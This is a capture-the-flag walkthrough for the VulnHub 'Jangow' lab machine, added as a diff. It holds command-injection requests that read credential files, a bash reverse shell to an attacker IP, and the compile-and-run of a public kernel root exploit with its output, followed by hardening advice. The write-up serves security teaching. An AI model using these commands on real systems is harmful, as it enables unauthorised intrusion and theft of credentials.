@@ -1,0 +1,347 @@
+================================================================================
+Jangow CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/jangow-101,754/
+================================================================================
+
+OBJECTIVE: Get the root flag
+DIFFICULTY: Easy
+TARGET IP: 10.0.2.14
+STYLE: The secret to this box is enumeration!
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Network scan
+nmap -sS -sV -A -p- 10.0.2.14
+
+Target: 10.0.2.14
+Open Ports:
+  21/tcp  - open (vsFTPd 3.0.3)
+  80/tcp  - open (Apache httpd 2.4.18 Ubuntu)
+
+# Key observation
+Only ports 21 and 80 are open. FTP will be crucial later for uploading
+and downloading files during exploitation.
+
+# Web vulnerability scan
+nikto -h http://10.0.2.14
+
+Findings:
+  - Apache/2.4.18 (outdated)
+  - Directory indexing enabled
+  - Missing security headers (X-Frame-Options, X-Content-Type-Options)
+  - Default Apache icons/README exposed
+
+================================================================================
+[2] WEB APPLICATION ANALYSIS
+================================================================================
+
+# Initial web enumeration
+curl http://10.0.2.14
+# Result: Directory listing showing /site/ folder
+
+# Site main page
+curl http://10.0.2.14/site/
+
+# Pages enumerated via browser:
+  http://10.0.2.14/site/#about
+  http://10.0.2.14/site/#projects
+  http://10.0.2.14/site/busque.php?buscar=
+
+# Critical discovery: busque.php accepts a "buscar" parameter
+# that executes system commands directly on the server
+
+================================================================================
+[3] COMMAND INJECTION & CREDENTIAL DISCOVERY
+================================================================================
+
+# Confirming command injection via busque.php
+curl http://10.0.2.14/site/busque.php?buscar=ls
+Output:
+  assets
+  busque.php
+  css
+  index.html
+  js
+  wordpress
+
+curl http://10.0.2.14/site/busque.php?buscar=pwd
+Output: /var/www/html/site
+
+# Enumerating the wordpress directory
+curl http://10.0.2.14/site/busque.php?buscar=ls%20wordpress
+Output:
+  config.php
+  index.html
+
+# Extracting database credentials from config.php
+curl http://10.0.2.14/site/busque.php?buscar=cat%20wordpress/config.php
+Output:
+  $servername = "localhost";
+  $database = "desafio02";
+  $username = "desafio02";
+  $password = "abygurl69";
+
+# Enumerating home directories
+curl http://10.0.2.14/site/busque.php?buscar=ls%20/home
+Output: jangow01
+
+# Discovering first flag
+curl http://10.0.2.14/site/busque.php?buscar=cat%20/home/jangow01/user.txt
+FLAG 1: d41d8cd98f00b204e9800998ecf8427e
+
+# FTP login attempt with desafio02 credentials - FAILED
+ftp 10.0.2.14
+Name: desafio02
+Password: abygurl69
+530 Login incorrect.
+
+# Discovering .backup file in web root
+curl http://10.0.2.14/site/busque.php?buscar=ls%20-la%20/var/www/html
+Output:
+  -rw-r--r-- 1 www-data www-data  336 Oct 31  2021 .backup
+  drwxr-xr-x 6 www-data www-data 4096 Jun 10  2021 site
+
+# Extracting second set of credentials from .backup
+curl http://10.0.2.14/site/busque.php?buscar=cat%20/var/www/html/.backup
+Output:
+  $servername = "localhost";
+  $database = "jangow01";
+  $username = "jangow01";
+  $password = "abygurl69";
+
+# FTP login with jangow01 credentials - SUCCESS
+ftp 10.0.2.14
+Name: jangow01
+Password: abygurl69
+230 Login successful.
+
+================================================================================
+[4] INITIAL ACCESS - REVERSE SHELL
+================================================================================
+
+# Prepare reverse shell payload
+# Reference: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+# Payload: /bin/bash -c 'bash -i >& /dev/tcp/10.0.2.6/443 0>&1'
+
+# URL-encode the payload for use in busque.php
+# Reference: https://www.urlencoder.org/
+# Encoded: %2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.6%2F443%200%3E%261%27
+
+# Start listener on attacker machine
+nc -nvlp 443
+listening on [any] 443 ...
+
+# Trigger reverse shell via command injection
+curl "http://10.0.2.14/site/busque.php?buscar=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.6%2F443%200%3E%261%27"
+
+# Connection received
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.14] 37316
+www-data@jangow01:/var/www/html/site$
+
+# Stabilize shell
+export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Switch to jangow01 user using credentials from .backup
+su jangow01
+Password: abygurl69
+
+jangow01@jangow01:/var/www/html/site$
+
+================================================================================
+[5] PRIVILEGE ESCALATION - ROOT ACCESS
+================================================================================
+
+# Upload linpeas.sh via FTP for privilege escalation enumeration
+# Reference: https://github.com/peass-ng/PEASS-ng/releases
+ftp 10.0.2.14
+Name: jangow01
+Password: abygurl69
+ftp> cd /home/jangow01
+ftp> put linpeas.sh
+226 Transfer complete.
+
+# Execute linpeas on target
+jangow01@jangow01:~$ chmod +x linpeas.sh
+jangow01@jangow01:~$ ./linpeas.sh
+
+# LinPEAS results - Vulnerable CVEs detected:
+#   [CVE-2017-16995] eBPF_verifier
+#   [CVE-2016-8655] chocobo_root
+#   [CVE-2016-5195] dirtycow
+#   [CVE-2016-5195] dirtycow 2
+
+# Selected exploit: CVE-2017-16995 (eBPF verifier bypass)
+# Reference: https://www.exploit-db.com/exploits/45010
+
+# Download exploit source (45010.c) on attacker machine
+# Upload exploit via FTP
+ftp 10.0.2.14
+Name: jangow01
+Password: abygurl69
+ftp> cd /home/jangow01
+ftp> put 45010.c
+226 Transfer complete.
+
+# Compile and execute the exploit
+jangow01@jangow01:~$ gcc 45010.c -o cve
+jangow01@jangow01:~$ ./cve
+
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff88003cd6fc00
+[*] Leaking sock struct from ffff88003d1f4b40
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff88003cecd480
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff88003cecd480
+[*] credentials patched, launching shell...
+
+# Verify root access
+# whoami
+root
+
+# Read root flag
+# cd /root
+# cat proof.txt
+FLAG 2 (ROOT): da39a3ee5e6b4b0d3255bfef95601890afd80709
+
+================================================================================
+[6] FLAGS SUMMARY
+================================================================================
+
+Flag 1: d41d8cd98f00b204e9800998ecf8427e  (Location: /home/jangow01/user.txt)
+Flag 2: da39a3ee5e6b4b0d3255bfef95601890afd80709  (Location: /root/proof.txt)
+
+================================================================================
+[7] VULNERABILITIES EXPLOITED
+================================================================================
+
+1. OS Command Injection
+   - busque.php passes user input directly to system commands
+   - No input sanitization or validation whatsoever
+   - Full server command execution as www-data
+
+2. Hardcoded Credentials
+   - Database credentials stored in plain text (wordpress/config.php)
+   - Backup file (.backup) exposed in web root with valid credentials
+   - Credentials reused for FTP and system user authentication
+
+3. Information Disclosure
+   - Directory indexing enabled on Apache
+   - .backup file accessible without authentication
+   - Sensitive configuration files readable via command injection
+
+4. Insecure File Permissions
+   - .backup file world-readable in web root
+   - config.php readable by web application user
+
+5. Kernel Vulnerability (CVE-2017-16995)
+   - Outdated kernel vulnerable to eBPF verifier bypass
+   - Allows unprivileged user to escalate to root
+   - No kernel patching or hardening applied
+
+================================================================================
+[8] TOOLS USED
+================================================================================
+
+- Nmap 7.98           : Network scanning and service enumeration
+- Nikto 2.5.0         : Web server vulnerability scanner
+- curl                : HTTP requests and command injection exploitation
+- vsFTPd (client)     : File upload/download via FTP
+- Netcat              : Reverse shell listener
+- Python 3.x          : Shell stabilization (PTY module)
+- LinPEAS             : Linux privilege escalation enumeration
+- GCC                 : Compiling C exploit (45010.c)
+- Exploit-DB 45010    : CVE-2017-16995 eBPF verifier exploit
+
+================================================================================
+[9] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. Input Validation
+   - Implement strict input sanitization on all user-supplied parameters
+   - Use parameterized queries; never pass user input to system calls
+   - Whitelist allowed input values where possible
+
+2. Credential Management
+   - Never hardcode credentials in source code or configuration files
+   - Use environment variables or secure credential stores
+   - Do not reuse credentials across different services
+   - Remove or protect backup files containing sensitive data
+
+3. File System Security
+   - Restrict permissions on configuration and backup files
+   - Remove unnecessary backup files from web-accessible directories
+   - Disable directory indexing on Apache (Options -Indexes)
+   - Implement file integrity monitoring
+
+4. System Hardening
+   - Keep kernel and all software up to date with security patches
+   - Apply kernel hardening measures (seccomp, AppArmor, SELinux)
+   - Regular vulnerability scanning and patch management
+   - Follow CIS benchmarks for system configuration
+
+5. Network Security
+   - Implement Web Application Firewall (WAF)
+   - Restrict FTP access; prefer SFTP with key-based authentication
+   - Use HTTPS/TLS for all web traffic
+   - Network segmentation and access control lists
+
+================================================================================
+[10] ATTACK CHAIN SUMMARY
+================================================================================
+
+Directory indexing & web enumeration
+    ↓
+Command injection discovery (busque.php)
+    ↓
+Credential extraction (wordpress/config.php)
+    ↓
+First flag capture (/home/jangow01/user.txt)
+    ↓
+.backup file discovery (/var/www/html/.backup)
+    ↓
+Second credential set extraction (jangow01:abygurl69)
+    ↓
+FTP access established (jangow01)
+    ↓
+Reverse shell via command injection (www-data)
+    ↓
+User escalation (www-data → jangow01)
+    ↓
+LinPEAS enumeration (CVE discovery)
+    ↓
+Exploit upload via FTP (45010.c)
+    ↓
+Kernel exploit compilation and execution (CVE-2017-16995)
+    ↓
+Privilege escalation (jangow01 → root)
+    ↓
+Root flag capture (/root/proof.txt)
+
+================================================================================
+REFERENCES
+================================================================================
+
+- VulnHub Jangow: https://www.vulnhub.com/entry/jangow-101,754/
+- Exploit-DB 45010: https://www.exploit-db.com/exploits/45010
+- LinPEAS: https://github.com/peass-ng/PEASS-ng
+- Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
+- OWASP Top 10: https://owasp.org/www-project-top-ten/
+
+================================================================================
+DISCLAIMER
+================================================================================
+
+This writeup is for educational purposes only. All techniques demonstrated
+should only be used on systems you own or have explicit permission to test.
+Unauthorized access to computer systems is illegal.
+
+================================================================================
